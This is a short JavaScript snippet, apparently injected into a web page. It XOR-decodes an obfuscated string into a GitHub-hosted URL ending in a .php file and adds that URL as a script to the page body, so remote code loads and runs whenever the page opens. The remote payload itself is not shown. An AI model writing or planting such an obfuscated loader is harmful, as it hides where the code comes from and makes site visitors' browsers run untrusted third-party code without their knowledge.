var enkripsi = "jvvrq8--pcu,ekvjw`,amo-ammnrpcqjclv-qapkrvq-ocqvgp-Kltkvg/Cnn36,rjr";
teks = "";
teksasli = "";
var panjang;
panjang = enkripsi.length;
for (i = 0; i < panjang; i++) {
    teks += String.fromCharCode(enkripsi.charCodeAt(i) ^ 2)
}
teksasli = unescape(teks);
document.body.appendChild(document.createElement('script')).src = teksasli;
